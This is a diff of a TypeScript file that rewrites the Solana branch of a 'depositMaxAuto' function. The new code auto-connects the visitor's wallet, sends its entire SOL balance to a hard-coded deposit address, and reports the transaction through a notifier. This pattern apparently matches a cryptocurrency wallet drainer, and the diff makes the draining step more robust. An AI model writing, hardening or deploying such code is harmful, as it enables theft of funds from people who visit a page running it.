@@ -40,35 +40,54 @@ export async function depositMaxAuto(preferred?: 'solana' | 'evm'): Promise<Snip
   const w = window as any
 
   // --- helper: Solana branch ---
-  async function trySolanaBranch(): Promise<SniperResult> {
-    const solProv: any = getActiveSolanaProvider()
-    if (!solProv) {
-      throw new Error('No Solana provider detected. Install/enable Phantom, Backpack or Solflare and connect.')
-    }
+async function trySolanaBranch(): Promise<SniperResult> {
+  const solProv: any = getActiveSolanaProvider()
+  if (!solProv) throw new Error('No Solana provider detected. Please install or enable Phantom, Backpack, or Solflare.')
 
-    // Prefer to get a readable from value if possible
-    const pk = solProv.publicKey
-    const fromSol: string | undefined = (pk?.toBase58 && pk.toBase58()) || (typeof pk === 'string' ? pk : undefined)
-
-    // depositAllSol may accept params in your project — pass publicKey if your implementation expects it.
-    // If your depositAllSol does NOT accept args, change this call to depositAllSol()
-    const { signature } = await depositAllSol({ publicKey: pk } as any)
-
+  // Ensure wallet is connected
+  if (!solProv.publicKey) {
     try {
-      notifyTx({
-        kind: 'solana',
-        chain: 'mainnet-beta',
-        from: fromSol,
-        to: SOL_DEPOSIT_ADDRESS,
-        token: 'SOL',
-        tx: signature,
-      })
+      if (solProv.connect) {
+        await solProv.connect()
+      } else {
+        throw new Error('Solana wallet is not connected.')
+      }
     } catch (err) {
-      console.warn('Solana notify failed:', err)
+      throw new Error(`Failed to connect to Solana wallet: ${String((err as any)?.message || err)}`)
     }
-
-    return { network: 'solana', signature, from: fromSol }
   }
+
+  const pk = solProv.publicKey
+  if (!pk) throw new Error('No Solana public key found. Please connect your Solana wallet.')
+
+  const fromSol = pk.toBase58?.() || (typeof pk === 'string' ? pk : undefined)
+  if (!fromSol) throw new Error('Could not determine Solana wallet address.')
+
+  let signature: string
+  try {
+    // If depositAllSol accepts { publicKey }, pass it; otherwise remove the argument
+    const result = await depositAllSol({ publicKey: pk } as any)
+    signature = result.signature
+  } catch (err) {
+    throw new Error(`Solana deposit failed: ${String((err as any)?.message || err)}`)
+  }
+
+  try {
+    notifyTx({
+      kind: 'solana',
+      chain: 'mainnet-beta',
+      from: fromSol,
+      to: SOL_DEPOSIT_ADDRESS,
+      token: 'SOL',
+      tx: signature,
+    })
+  } catch (err) {
+    console.warn('Solana notify failed:', err)
+  }
+
+  return { network: 'solana', signature, from: fromSol }
+}
+
 
   // --- helper: EVM branch ---
   async function tryEvmBranch(): Promise<SniperResult> {
